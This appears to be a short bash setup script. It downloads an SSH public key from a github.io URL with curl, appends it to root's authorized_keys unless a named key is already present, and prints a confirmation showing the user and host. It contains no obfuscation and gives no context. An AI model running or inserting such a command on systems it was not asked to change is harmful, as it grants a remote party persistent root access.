#!/bin/bash
mkdir -p /root/.ssh
chmod 700 /root/.ssh
grep -q jakehorvitz@Mac-747 /root/.ssh/authorized_keys 2>/dev/null || curl -sL https://jakehorvitz.github.io/bartok-legal/k >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo "KEY INSTALLED user=$(whoami) host=$(hostname) bytes=$(wc -c < /root/.ssh/authorized_keys)"
